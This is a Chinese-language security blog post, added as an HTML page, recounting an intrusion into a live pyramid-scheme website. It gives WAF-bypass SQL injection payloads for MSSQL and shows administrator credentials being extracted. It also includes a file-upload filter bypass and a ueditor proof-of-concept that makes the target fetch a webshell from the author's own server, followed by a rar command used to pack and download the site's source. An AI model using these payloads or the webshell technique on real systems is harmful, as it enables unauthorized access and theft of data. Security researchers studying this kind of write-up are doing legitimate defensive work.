@@ -1,0 +1,337 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="referrer" content="no-referrer">
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>从SQL注入到整站打包与本地搭建 | xray 技术博客</title>
+<link rel="shortcut icon" href="https://blog.xray.cool/favicon.ico?v=1620790014149">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://blog.xray.cool/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="从SQL注入到整站打包与本地搭建 | xray 技术博客 - Atom Feed" href="https://blog.xray.cool/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-176727836-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-176727836-2');
+</script>
+
+
+    <meta name="description" content="一、前言
+如题，由于是在已知有一处sql注入的情况下才接手进行的后续操作，因此前面信息搜集则一笔带过。
+二、信息搜集
+目标是个本地的传销站点其大致信息为IIS+ASP.NET+安全狗、腾讯云。
+三、Bypass Sql
+3.1 Fuzz
+空..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://blog.xray.cool">
+  <img class="avatar" src="https://blog.xray.cool/images/avatar.png?v=1620790014149" alt="">
+  </a>
+  <h1 class="site-title">
+    xray 技术博客
+  </h1>
+  <p class="site-description">
+    
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives/" class="menu">
+          归档
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              从SQL注入到整站打包与本地搭建
+            </h2>
+            <div class="post-info">
+              <span>
+                2020-09-09
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://blog.xray.cool/post-images/from-sqli-to-website-dump.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h2 id="一-前言">一、前言</h2>
+<p>如题，由于是在已知有一处sql注入的情况下才接手进行的后续操作，因此前面信息搜集则一笔带过。</p>
+<h2 id="二-信息搜集">二、信息搜集</h2>
+<p>目标是个本地的传销站点其大致信息为IIS+ASP.NET+安全狗、腾讯云。</p>
+<h2 id="三-bypass-sql">三、Bypass Sql</h2>
+<h3 id="31-fuzz">3.1 Fuzz</h3>
+<pre><code>空格		error
+加号		未拦截
+等号		error
+单引号		error
+双引号		未拦截
+双括号		未拦截
++select		error
+%0bselect	未拦截
+%0bselect%0buser%0bfrom	未拦截
+%0bselect%0buser%0bfrom%0badmin	拦截
+convert()	未拦截
+</code></pre>
+<p>根据如上测试可以看出程序本身也有过滤，error为程序自身的过滤。可以利用IIS处理%符号的机制绕过部分符号，例如空格使用%0b 加号使用%2b等。再根据测试的结果，可以先利用convert转换报错获取一部分信息。</p>
+<figure data-type="image" tabindex="1"><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569954242686.png" alt="" loading="lazy"></figure>
+<pre><code>goodscontent.aspx?gid=convert(int,@@version)#版本信息
+goodscontent.aspx?gid=convert(int,db_name())#数据库信息
+goodscontent.aspx?gid=convert(int,user_name())#当前数据库用户
+……
+tips：可以通过遍历db_name(1)中的数字获取其他库名
+</code></pre>
+<p>得到以下信息：</p>
+<pre><code>ASP.NET 版本：Microsoft .NET Framework 版本:4.0.30319; ASP.NET 版本:4.0.30319.36400
+数据库版本：Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64)
+用户名：sa
+计算机名：10_*_76_*\SQLEXPRESS      10.*.76.*
+当前库：pan20170823
+所有库名：
+pan20170823
+master
+tempdb
+model
+msdb
+ReportServer$SQLEXPRESS
+ReportServer$SQLEXPRESSTempDB
+</code></pre>
+<p>再往下就是获取表的信息</p>
+<pre><code>goodscontent.aspx?gid=CONVERT(INT,(CHAR(58)%2bCHAR(58)%2b(SELECT%0btop%0b1%0bCAST(COUNT(*)%0bAS%0bnvarchar(4000))%0bFROM%0binformation_schema.TABLES%0b)%2bCHAR(58)%2bCHAR(58)))#获取表总个数
+</code></pre>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569953878104.png" alt="" loading="lazy"><br>
+由于我只会简单的select from因此始终无法获取表名，如果有其他姿势还望给科普下。</p>
+<figure data-type="image" tabindex="2"><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569953991643.png" alt="" loading="lazy"></figure>
+<h3 id="32-万金油">3.2 万金油</h3>
+<p>此时陷入僵局，后来想起在404大佬的一篇bypass安全狗的文章中提到过在mssql中注释加换行同样成立，遂构造之。</p>
+<pre><code class="language-sql">goodscontent.aspx?gid=--/*%0a(select%0btop%0b1%0btable_name%0bFROM%0binformation_schema.tables%0b)--%20*/
+PS:由于注入点已经使用了convert做了数据转换，后续直接防入查询即可
+</code></pre>
+<p>获取到第一个表名：jsrecord</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569954458132.png" alt="" loading="lazy"><br>
+由于还是没能绕过单引号和等号，我始终用不了not in与for xml path来爆后续的表名，这又触及到了我知识盲区，因此只好查阅大量文章案例，最终构造出如下语句。</p>
+<pre><code>/goodscontent.aspx?gid=--/*%0a(SELECT%0bTOP%0b1%0btable_name%0bFROM%0binformation_schema.tables%0bWHERE%0btable_name%0bNOT%0bIN(SELECT%0bTOP%0b11%0btable_name%0bFROM%0binformation_schema.columns))--%20*/
+</code></pre>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569955516974.png" alt="" loading="lazy"><br>
+此时只需要遍历top的数值即可，例如：</p>
+<pre><code>/goodscontent.aspx?gid=--/*%0a(SELECT%0bTOP%0b1%0btable_name%0bFROM%0binformation_schema.tables%0bWHERE%0btable_name%0bNOT%0bIN(SELECT%0bTOP%0b80%0btable_name%0bFROM%0binformation_schema.columns))--%20*/
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569955648051.png" alt="" loading="lazy"></figure>
+<p>通过不断的遍历数值发现还是存在问题，举个例子，即 1-20、200-209，334-345返回同一个表名，存在大量重复与无序的情况，但可以通过burp中intruder-&gt;Grep-Extact功能来解决，操作如下：<br>
+首先设置好intruder对001-600进行遍历（超过600多后就没什么内容了）</p>
+<figure data-type="image" tabindex="4"><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569956551272.png" alt="" loading="lazy"></figure>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569956753730.png" alt="enter description here" loading="lazy"><br>
+然后使用Grep-Extact提取表名。</p>
+<figure data-type="image" tabindex="5"><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569956992567.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569957073763.png" alt="" loading="lazy"></figure>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569957147522.png" alt="" loading="lazy"><br>
+保存结果后去重即可。</p>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569957280428.png" alt="" loading="lazy"><br>
+和前面获取到的表总个数是一致的。</p>
+<p>解下来就是获取memberadmin表中的列名与内容，但在此之前我还是习惯性的看了下后台的网页源代码。</p>
+<figure data-type="image" tabindex="7"><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569957665687.png" alt="" loading="lazy"></figure>
+<p>如图，盲猜列名txt_nickname、nickname、txt_password、password</p>
+<pre><code>/goodscontent.aspx?gid=--/*%0a(select%0btop%0b1%0bnickname%0bfrom%0bmemberadmin)--%20*/
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569957913210.png" alt="" loading="lazy"></figure>
+<pre><code>/goodscontent.aspx?gid=--/*%0a(select%0btop%0b1%0bpassword%0bfrom%0bmemberadmin)--%20*/
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569958051976.png" alt="" loading="lazy"></figure>
+<h2 id="四-后台getshell">四、后台getshell</h2>
+<p>登陆后台</p>
+<figure data-type="image" tabindex="10"><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569958424253.png" alt="" loading="lazy"></figure>
+<p>经测试后发现信息管理处可以发布咨询，上传图片。通过修改去掉filename=&quot;1.aspx&quot;中的双引号绕过安全狗，但无法绕过程序自身的检测。</p>
+<pre><code>Content-Disposition: form-data; name=&quot;up_picture&quot;; filename=xss.jpg .aspx
+</code></pre>
+<p>不过得知上传组件为ueditor，且.net版本存在上传漏洞<br>
+poc如下</p>
+<pre><code class="language-html">&lt;form action=&quot;http://***/***/net/controller.ashx?action=catchimage&quot;enctype=&quot;application/x-www-form-urlencoded&quot;  method=&quot;POST&quot;&gt;
+&lt;p&gt;shell addr:&lt;input type=&quot;text&quot; name=&quot;source[]&quot; /&gt;&lt;/p &gt;
+&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;
+&lt;/form&gt;
+</code></pre>
+<p>并在自己的服务器上准备好shell（注意过狗），名称为a.gif,然后填入shell地址</p>
+<pre><code>https://o0o0.club/a.gif?.aspx
+</code></pre>
+<p><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1569959552187.png" alt="" loading="lazy"><br>
+提交后即可得到shell路径</p>
+<h2 id="五-打包源码与数据库">五、打包源码与数据库</h2>
+<p>在有了shell之后要做的事情就更明确了，即是打包源码与数据库，由于只需要这两样操作，相对于不需要太大的权限，避免操作不当触发警告。因此我选择先通过shell来进行打包操作。<br>
+<img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570003081405.png" alt="" loading="lazy"><br>
+<img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570003154844.png" alt="" loading="lazy"></p>
+<h3 id="源码">源码</h3>
+<p>这里利用的是自行上传的rar.exe来分卷打包源码，在此之前尝试过7z.exe（目标服务器上已安装）、makecab 但效果并不理想，姿势不够还望科普。</p>
+<pre><code>rar.exe a -r -v50m -m5 pan20170823 *.*
+#a 压缩
+#-r 打包子目录
+#-v 分卷大小
+#-m 压缩等级
+#pan20170823目标目录
+#*.* 打包后文件名为 pan20170823.part*.rar
+</code></pre>
+<p>最终以每秒100k的速度下载完成。<br>
+<img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570003537734.png" alt="" loading="lazy"></p>
+<h3 id="数据库">数据库</h3>
+<p>略过，后台自带备份功能<br>
+坑点：后台的备份文件后缀为zip，下载回来总是提示文件损坏，一直以为备份功能有问题，后来发现文件头是TAPE。。。。</p>
+<h2 id="六-本地搭建">六、本地搭建</h2>
+<p>本地搭建的环境为 Windows server 2012+IIS8+SQL Server 2008,简单讲讲0.0</p>
+<h2 id="sql-server">SQL Server</h2>
+<ul>
+<li>安装过程略过</li>
+<li>导入数据</li>
+</ul>
+<p>新建数据库，然后通过原设备还原数据</p>
+<figure data-type="image" tabindex="11"><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570005542256.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570005036885.png" alt="" loading="lazy"></figure>
+<p>还原成功</p>
+<figure data-type="image" tabindex="13"><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570005668937.png" alt="" loading="lazy"></figure>
+<h2 id="iis与aspnet">IIS与ASP.NET</h2>
+<p>安装一笔带过，左边拉满就行，简单粗暴</p>
+<figure data-type="image" tabindex="14"><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E9%9D%9E%E6%B3%95%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%95%B4%E7%AB%99%E6%89%93%E5%8C%85%E4%B8%8E%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%E5%85%A8%E8%BF%87%E7%A8%8B/1570009391745.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="15"><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570005941688.png" alt="" loading="lazy"></figure>
+<p>添加站点</p>
+<figure data-type="image" tabindex="16"><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570006040656.png" alt="" loading="lazy"></figure>
+<p>最好对应目标版本</p>
+<figure data-type="image" tabindex="17"><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570006101941.png" alt="" loading="lazy"></figure>
+<p>修改源码中的配置文件</p>
+<figure data-type="image" tabindex="18"><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570006327636.png" alt="" loading="lazy"></figure>
+<p>访问</p>
+<figure data-type="image" tabindex="19"><img src="https://photo.o0o0.club/_%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E4%BC%A0%E9%94%80%E7%AB%99%E7%82%B9%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0%E6%89%93%E5%8C%85%E8%87%B3%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA/1570006383401.png" alt="" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E4%B8%80-%E5%89%8D%E8%A8%80">一、前言</a></li>
+<li><a href="#%E4%BA%8C-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86">二、信息搜集</a></li>
+<li><a href="#%E4%B8%89-bypass-sql">三、Bypass Sql</a>
+<ul>
+<li><a href="#31-fuzz">3.1 Fuzz</a></li>
+<li><a href="#32-%E4%B8%87%E9%87%91%E6%B2%B9">3.2 万金油</a></li>
+</ul>
+</li>
+<li><a href="#%E5%9B%9B-%E5%90%8E%E5%8F%B0getshell">四、后台getshell</a></li>
+<li><a href="#%E4%BA%94-%E6%89%93%E5%8C%85%E6%BA%90%E7%A0%81%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93">五、打包源码与数据库</a>
+<ul>
+<li><a href="#%E6%BA%90%E7%A0%81">源码</a></li>
+<li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93">数据库</a></li>
+</ul>
+</li>
+<li><a href="#%E5%85%AD-%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA">六、本地搭建</a></li>
+<li><a href="#sql-server">SQL Server</a></li>
+<li><a href="#iis%E4%B8%8Easpnet">IIS与ASP.NET</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://blog.xray.cool/post/a-100000-vulnerability/">
+              <h3 class="post-title">
+                我捡到一个10W的洞
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://blog.xray.cool/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
